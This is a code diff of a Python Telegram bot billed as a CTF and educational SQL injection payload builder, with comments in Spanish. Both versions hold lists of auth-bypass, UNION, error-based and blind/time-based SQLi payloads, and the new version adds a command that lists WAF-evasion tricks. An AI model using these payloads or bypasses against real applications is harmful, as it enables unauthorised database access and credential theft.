@@ -1,67 +1,83 @@
-# bots/ctf-osint/tg_05_sqli_builder.py
-# ╔══════════════════════════════════════════════════════════════╗
-# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
-# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
-# ║  Dueño del código: Juan Alberti                              ║
-# ║  Repositorio: https://github.com/AlbertiJ/Plantillas-de-bots ║
-# ╚══════════════════════════════════════════════════════════════╝
-# PROPÓSITO: Bot Telegram — SQL Injection Payload Builder (CTF)
-# Ejecución: python bots/ctf-osint/tg_05_sqli_builder.py
-# IDEA FUTURA: generador dinámico según DB target (MySQL, MSSQL, Postgres)
+#!/usr/bin/env python3
+"""
+tg_05_sqli_builder.py — CTF: Constructor de payloads SQLi para Telegram
+SOLO PARA SISTEMAS AUTORIZADOS / EDUCATIVO / CTF.
+MODIFICAR: agregar más payloads en PAYLOADS.
+"""
+import logging, os
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
-from bots.shared.env import require_env
-from bots.shared.logger import get_logger
+TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
+logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
 
-logger = get_logger(__name__)
-TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env
-DISCLAIMER = "⚠️ USO ÉTICO OBLIGATORIO — Solo CTF y entornos con permiso escrito."
-
-# MODIFICAR: agregar, quitar o adaptar payloads según el CTF
+# MODIFICAR: agregar más payloads de CTF
 PAYLOADS = {
-    "auth_bypass": {"label": "🔓 Auth Bypass", "payloads": ["' OR '1'='1","' OR 1=1 --","admin'--","' OR 1=1#","') OR ('1'='1"]},
-    "union_based": {"label": "🔗 UNION Based", "payloads": ["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT username,password FROM users--","' UNION ALL SELECT table_name,NULL FROM information_schema.tables--"]},
-    "error_based": {"label": "💥 Error Based", "payloads": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","1 AND exp(~(SELECT * FROM (SELECT user())x))--"]},
-    "boolean_blind": {"label": "🔍 Boolean Blind", "payloads": ["' AND 1=1--","' AND 1=2--","' AND SUBSTRING(username,1,1)='a'--","' AND (SELECT COUNT(*) FROM users)>0--"]},
-    "time_based": {"label": "⏱️ Time Based", "payloads": ["' AND SLEEP(5)--","'; SELECT pg_sleep(5)--","1; WAITFOR DELAY '0:0:5'--"]},
+    "union":  ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "1 UNION SELECT table_name FROM information_schema.tables--"],
+    "error":  ["'", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#"],
+    "blind":  ["' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--"],
+    "time":   ["'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "1; SELECT pg_sleep(5)--"],
+    "auth":   ["admin'--", "' OR '1'='1'--", "admin' /*", "') OR ('1'='1"],
 }
 
+async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    await update.message.reply_text(
+        "\U0001F6E1 SQLi Builder — Solo CTF/sistemas autorizados\n\n"
+        "/sqli <tipo> — (union|error|blind|time|auth)\n"
+        "/explain <payload>\n/bypass <filtro>"
+    )
 
-async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton(v["label"], callback_data=k)] for k,v in PAYLOADS.items()]
-    await update.message.reply_text(f"SQLi Payload Builder — CTF\n\n{DISCLAIMER}\n\nElegí una técnica:", reply_markup=InlineKeyboardMarkup(keyboard))
-
-
-async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    cat = query.data
-    if cat not in PAYLOADS: await query.edit_message_text("Categoría no encontrada."); return
-    data = PAYLOADS[cat]
-    payloads_text = "\n".join(f"{i+1}. {p}" for i,p in enumerate(data["payloads"]))
-    await query.edit_message_text(f"{data['label']}\n\n{payloads_text}\n\n{DISCLAIMER}")
-
-
-async def sqli_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def sqli_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if not ctx.args:
-        await update.message.reply_text(f"Uso: /sqli <categoria>\nCategorías: {' | '.join(PAYLOADS.keys())}")
+        await update.message.reply_text("Tipos: " + ", ".join(PAYLOADS.keys()))
         return
-    cat = ctx.args[0].lower()
-    if cat not in PAYLOADS: await update.message.reply_text(f"Categoría no encontrada: {cat}"); return
-    data = PAYLOADS[cat]
-    payloads_text = "\n".join(f"{i+1}. {p}" for i,p in enumerate(data["payloads"]))
-    await update.message.reply_text(f"{data['label']}\n\n{payloads_text}\n\n{DISCLAIMER}")
+    tipo     = ctx.args[0].lower()
+    payloads = PAYLOADS.get(tipo)
+    if not payloads:
+        await update.message.reply_text(f"Tipo desconocido. Disponibles: {', '.join(PAYLOADS.keys())}")
+        return
+    lines = [f"\U0001F4CB Payloads SQLi ({tipo}):"] + [f"  {p}" for p in payloads]
+    await update.message.reply_text("\n".join(lines))
 
+async def explain_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    if not ctx.args:
+        return
+    payload = " ".join(ctx.args)
+    # MODIFICAR: agregar más explicaciones
+    exps = {
+        "OR":    "Condición siempre verdadera — bypasea autenticación básica",
+        "UNION": "Combina resultados para extraer datos de otras tablas",
+        "SLEEP": "Time-based blind SQLi — detecta inyección por delay",
+        "DROP":  "Destructivo — borra la tabla completa",
+        "--":    "Comentario SQL — ignora el resto de la query",
+    }
+    for key, exp in exps.items():
+        if key.upper() in payload.upper():
+            await update.message.reply_text(f"\U0001F4A1 {payload}\n\n{exp}")
+            return
+    await update.message.reply_text("MODIFICAR: agregar explicación para este payload.")
 
-def main():
-    app = ApplicationBuilder().token(TOKEN).build()
+async def bypass_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    filtro = " ".join(ctx.args) if ctx.args else "genérico"
+    # MODIFICAR: agregar más técnicas de bypass según el WAF
+    await update.message.reply_text(
+        f"\U0001F6A7 Bypass para: {filtro}\n\n"
+        "Comentarios: /*comment*/ o /*!comment*/\n"
+        "Case mixing: SeLeCt, uNiOn\n"
+        "URL encode: %27=', %20=espacio\n"
+        "Hex: 0x61646d696e = 'admin'\n"
+        "Concat: CONCAT(0x61,0x64,0x6d,0x69,0x6e)"
+    )
+
+def main() -> None:
+    if not TOKEN:
+        raise ValueError("TELEGRAM_BOT_TOKEN no está configurado en .env")
+    app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("sqli", sqli_cmd))
-    app.add_handler(CallbackQueryHandler(callback_handler))
-    logger.info("Bot SQLi Builder iniciado.")
+    app.add_handler(CommandHandler("explain", explain_cmd))
+    app.add_handler(CommandHandler("bypass", bypass_cmd))
     app.run_polling()
-
 
 if __name__ == "__main__":
     main()
